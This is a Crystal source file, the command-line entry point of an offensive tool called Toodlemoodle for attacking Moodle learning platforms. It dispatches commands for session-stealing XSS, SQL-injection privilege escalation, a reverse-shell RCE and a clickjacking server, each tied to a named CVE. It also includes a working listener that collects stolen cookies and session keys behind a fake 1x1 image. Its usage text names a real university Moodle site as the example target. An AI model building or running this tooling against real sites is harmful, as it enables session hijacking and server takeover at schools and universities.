# TODO: Write documentation for `Toodlemoodle`
require "http/client"
require "option_parser"
require "json"
require "base64"
require "http/server"
require "./actions/*"

module Toodlemoodle
  include TMoodleActions
  VERSION = "0.1.0"

  main = Main.new
  main.main

  class Main
    @command = ""
    @target = ""

    def main
      begin
        puts <<-STRING
        ████████╗███╗   ███╗ ██████╗  ██████╗ ██████╗ ██╗     ███████╗
        ╚══██╔══╝████╗ ████║██╔═══██╗██╔═══██╗██╔══██╗██║     ██╔════╝
           ██║   ██╔████╔██║██║   ██║██║   ██║██║  ██║██║     █████╗
           ██║   ██║╚██╔╝██║██║   ██║██║   ██║██║  ██║██║     ██╔══╝
           ██║   ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██████╔╝███████╗███████╗
           ╚═╝   ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝╚══════╝
        STRING
        OptionParser.parse! do |parser|
          parser.banner = "Usage: tmoodle command [arguments]\n" \
                          "Commands:\nscan -- Scans the target, revealing the version.\n" \
                          "dashboard_xss -- Inserts a session stealer on to your dashboard for the Admin hijack CVE-2019-3847.\n" \
                          "assignment_xss -- Specially crafted URLs to steal sessions using CVE-2017-2578.\n" \
                          "sql_injection -- Exploits CVE-2017-2641 to escalate a user's privelege. \n" \
                          "rce_shell -- Exploits CVE-2018-1133 (must be a teacher) to launch a reverse shell.\n" \
                          "clickjack -- starts the clickjacker server\n"\
                          "listen -- Listen for cookies\n"
          parser.separator("\nArguments:")
          parser.on("-t TARGET", "--target=TARGET", "Moodle target to attack. Do not include a slash at the end! Example: https://ole.unibz.it ") do |str|
            @target = str
          end

          parser.on("-h", "--help", "Show this help message.") { puts parser }
          parser.invalid_option do |flag|
            STDERR.puts "ERROR: #{flag} is not a valid option.\n"
            STDERR.puts parser
            exit(1)
          end
          parser.unknown_args do |args|
            if args.size > 0
              @command = args[0]
            else
              STDERR.puts "ERROR: No command given.\n"
              STDERR.puts parser
              exit(1)
            end
          end
        end

        case @command
        when "scan"
          target_required()
          scanner = Scanner.new
          scanner.perform(@target)
        when "dashboard_xss"
          target_required()
          dashboard_xss = DashboardXSS.new
          dashboard_xss.perform(@target)
        when "assignment_xss"
          target_required()
          assignment_xss = AssignmentXSS.new
          assignment_xss.perform(@target)
        when "sql_injection"
          target_required()
          sql_injection = SqlInjection.new
          sql_injection.perform(@target)
        when "rce_shell"
          rce_exploit = RCEExploit.new
          rce_exploit.perform(@target)
        when "clickjack"
          puts "[*] Listening..."
          server = HTTP::Server.new([
            HTTP::ErrorHandler.new,
            HTTP::CompressHandler.new,
            HTTP::StaticFileHandler.new("clickjack"),
          ])

          server.bind_tcp "0.0.0.0", 80
          server.listen
        when "listen"
          # Starts a tiny HTTP server that listens for session keys and cookies.
          # Always returns a transparent 1x1 image.
          server = HTTP::Server.new do |context|
            context.response.content_type = "image/png;base64"
            if context.request.query_params["session"]?
              session = context.request.query_params["session"].not_nil!
              split = session.split('|').not_nil!
              puts "Cookie: " + split[0]
              puts "Moodle Sess key: " + split[1]
            end
            puts "Received request " + context.request.path
            context.response.print "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="
          end

          address = server.bind_tcp 8080
          puts "Listening on http://#{address}"
          server.listen
        else
          STDERR.puts "ERROR: Command \"#{@command}\" given does not exist.\n"
          # STDERR.puts @parser
          exit(1)
        end
      rescue ex
        puts "Error occured"
        puts ex.message
        exit(1)
      end
    end

    def target_required
      if !@target
        STDERR.puts "ERROR: Please specify a target.\n"
        exit(1)
      end
    end
  end
end
